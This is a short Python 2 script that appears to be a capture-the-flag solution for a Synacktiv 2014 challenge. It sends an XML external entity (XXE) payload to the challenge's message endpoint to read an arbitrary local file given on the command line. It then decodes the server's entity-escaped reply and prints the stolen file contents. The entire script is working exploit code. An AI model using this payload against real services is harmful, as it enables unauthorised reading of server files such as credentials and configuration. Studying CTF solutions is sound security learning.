#!/usr/bin/python2
# -*- coding: utf-8 -*-
import requests
import json
import sys
import io
import HTMLParser
f=sys.argv[1]
payload='''<?xml  version="1.0"?>
<!DOCTYPE  msg [
<!ENTITY  test  SYSTEM "file://'''+f+'''">
]>
<msg>
&test;
</msg>'''
data = {
	"vs": "",
	"body": payload ,
	"title": "a"
}
s = requests.Session()
r = s.post("http://nsc2014.synacktiv.com:65480/msg.add", data=data)

data = json.loads(r.text)['messages'][0]['body'].replace("<msg>", "").replace("</msg>", "")
data = data.encode("utf-8").encode('ascii')
i = 0
ret = ""
while i < len(data):
	if data[i:i+3] == "&#x":
		ret += chr(int(data[i+3:i+5], 16))
		i += 6
	else:
		ret += data[i]
		i += 1
print ret.replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
